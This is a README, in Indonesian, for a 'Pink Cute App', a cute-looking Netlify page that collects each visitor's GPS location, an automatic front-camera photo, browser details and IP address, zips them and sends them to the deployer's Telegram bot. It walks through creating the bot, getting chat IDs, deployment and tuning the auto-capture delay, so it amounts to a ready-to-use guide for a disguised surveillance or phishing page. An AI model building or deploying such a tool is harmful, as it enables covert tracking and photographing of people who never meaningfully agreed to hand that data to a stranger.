# 💕 Pink Cute App - Static Web App for Netlify

Web app statis dengan UI pink modern yang mengumpulkan lokasi, foto, dan info browser pengguna, kemudian mengirimkannya ke Telegram Bot.

## ✨ Fitur

- 🎨 **UI Pink Modern** - Desain lucu dengan animasi halus
- 📍 **Location Access** - Mengambil lokasi GPS pengguna
- 📸 **Auto Camera Capture** - Otomatis mengambil foto dari kamera
- 🌐 **Browser Info** - Mengumpulkan informasi browser lengkap (User Agent, Screen Resolution, IP, dll)
- 📦 **Client-Side ZIP** - Membuat ZIP file di browser menggunakan JSZip
- 🤖 **Telegram Integration** - Mengirim data ke Telegram Bot via Netlify Function
- 📱 **Responsive** - Tampilan optimal di mobile dan desktop

## 🚀 Panduan Setup Telegram Bot

### 1. Membuat Telegram Bot

1. Buka Telegram dan cari **@BotFather**
2. Kirim perintah `/newbot`
3. Ikuti instruksi:
   - Berikan nama bot (contoh: "Pink Data Collector")
   - Berikan username bot (harus diakhiri dengan "bot", contoh: "pink_data_bot")
4. **BotFather** akan memberikan **Bot Token**. Simpan token ini!
   - Format: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`

### 2. Mendapatkan Chat ID

#### Opsi A: Menggunakan Bot IDBot (Mudah)
1. Cari **@myidbot** di Telegram
2. Kirim perintah `/getid`
3. Bot akan mengirim **Chat ID** Anda
   - Format: `123456789`

#### Opsi B: Manual
1. Kirim pesan apapun ke bot Anda
2. Buka browser dan akses:
   ```
   https://api.telegram.org/bot<BOT_TOKEN>/getUpdates
   ```
   Ganti `<BOT_TOKEN>` dengan token bot Anda
3. Cari `"chat":{"id":` di response JSON
4. Angka setelah `"id":` adalah **Chat ID** Anda

### 3. Mendapatkan Group Chat ID (Opsional)

Jika ingin mengirim ke Telegram Group:

1. Tambahkan bot Anda ke group
2. Kirim pesan di group tersebut
3. Akses URL berikut di browser:
   ```
   https://api.telegram.org/bot<BOT_TOKEN>/getUpdates
   ```
4. Cari `"chat":{"id":` untuk group tersebut
5. Group Chat ID biasanya dimulai dengan tanda minus (contoh: `-123456789`)

## 📦 Setup Project

### 1. Clone atau Download Project

```bash
cd netlify-app
```

### 2. Install Dependencies

```bash
npm install
# atau
yarn install
```

### 3. Setup Environment Variables (Local Testing)

Buat file `.env` di root folder:

```env
BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
CHAT_ID=123456789
```

Ganti dengan token dan chat ID Anda!

### 4. Test Locally

```bash
netlify dev
```

Buka browser di `http://localhost:8888`

## 🌐 Deploy ke Netlify

### Metode 1: Deploy via GitHub (Recommended)

#### 1. Push ke GitHub

```bash
# Inisialisasi git (jika belum)
git init

# Tambahkan remote repository
git remote add origin https://github.com/username/repo-name.git

# Commit dan push
git add .
git commit -m "Initial commit: Pink Cute App"
git push -u origin main
```

#### 2. Connect ke Netlify

1. Login ke [Netlify](https://app.netlify.com)
2. Klik **"Add new site" → "Import an existing project"**
3. Pilih **"GitHub"** dan authorize Netlify
4. Pilih repository Anda
5. Configure build settings:
   - **Build command:** (kosongkan atau `echo 'Static site'`)
   - **Publish directory:** `public`
6. Klik **"Deploy site"**

#### 3. Setup Environment Variables di Netlify

1. Di dashboard Netlify, buka **"Site settings" → "Environment variables"**
2. Klik **"Add a variable"**
3. Tambahkan:
   - **Key:** `BOT_TOKEN`
   - **Value:** Token bot Telegram Anda
4. Klik **"Add a variable"** lagi
5. Tambahkan:
   - **Key:** `CHAT_ID`
   - **Value:** Chat ID Telegram Anda
6. Klik **"Save"**

#### 4. Redeploy

1. Kembali ke **"Deploys"** tab
2. Klik **"Trigger deploy" → "Deploy site"**
3. Tunggu deployment selesai
4. Buka URL site Anda!

### Metode 2: Deploy via Netlify CLI

```bash
# Install Netlify CLI
npm install -g netlify-cli

# Login
netlify login

# Deploy
netlify deploy --prod
```

Saat deploy, Netlify akan meminta:
- Pilih "Create & configure a new site"
- Publish directory: `public`

Setelah deploy, set environment variables via dashboard.

### Metode 3: Deploy via Drag & Drop

1. Compress folder `public` menjadi ZIP
2. Login ke [Netlify](https://app.netlify.com)
3. Drag & drop ZIP file ke area deployment
4. Set environment variables di dashboard
5. Redeploy site

## 🔧 Konfigurasi

### Mengubah Warna Tema

Edit file `public/style.css`:

```css
/* Ganti gradient utama */
body {
    background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #ffecd2 100%);
}
```

### Mengubah Delay Auto-Capture

Edit file `public/app.js`, cari:

```javascript
// Auto-capture after 1 second
await new Promise(resolve => setTimeout(resolve, 1000));
```

Ubah `1000` (milidetik) sesuai keinginan.

## 📱 Testing di Mobile

1. Deploy ke Netlify
2. Buka URL site di mobile browser
3. Berikan permission untuk location dan camera
4. Aplikasi akan otomatis mengambil foto dan data

## 🐛 Troubleshooting

### Permission Denied
- Pastikan menggunakan **HTTPS** (Netlify otomatis provide SSL)
- Browser harus support Geolocation API dan getUserMedia
- User harus manually allow permission

### Telegram Send Failed
- Cek apakah **BOT_TOKEN** dan **CHAT_ID** sudah benar
- Pastikan bot sudah di-start (kirim `/start` ke bot)
- Untuk group, pastikan bot sudah ditambahkan sebagai member

### Function Error
- Cek Netlify Function logs di dashboard
- Pastikan `form-data` package ter-install di dependencies

## 📄 File Structure

```
netlify-app/
├── public/
│   ├── index.html          # Main HTML
│   ├── style.css           # Pink modern styles
│   └── app.js              # Main JavaScript logic
├── netlify/
│   └── functions/
│       └── send-to-telegram.js  # Serverless function
├── package.json            # Dependencies
├── netlify.toml            # Netlify configuration
├── .gitignore
└── README.md
```

## 🔐 Keamanan

- **JANGAN** commit file `.env` ke Git
- **BOT_TOKEN** dan **CHAT_ID** harus disimpan di Netlify Environment Variables
- Gunakan HTTPS untuk deployment

## 📊 Data yang Dikumpulkan

### 1. photo.jpg
- Foto dari kamera depan
- Format: JPEG
- Quality: 80%

### 2. lokasi.txt
- Latitude
- Longitude
- Accuracy (meter)
- Timestamp

### 3. info.txt
- User Agent
- Platform (OS)
- Language
- Screen Resolution
- Viewport Size
- Browser Name & Version
- Cookie Enabled
- Online Status
- Timezone
- IP Address (dari Netlify)
- Timestamp

## 💡 Tips

1. **Test di HTTPS** - Browser memerlukan HTTPS untuk akses camera dan location
2. **Mobile First** - Aplikasi dirancang untuk mobile, test di mobile device
3. **Clear Cache** - Jika permission stuck, clear browser cache
4. **Bot Privacy** - Jangan share Bot Token ke publik

## 🎉 Selesai!

Aplikasi Anda siap digunakan! Setiap kali user mengakses dan memberikan permission, data akan otomatis terkirim ke Telegram Anda.

---

**Made with 💕 by E1**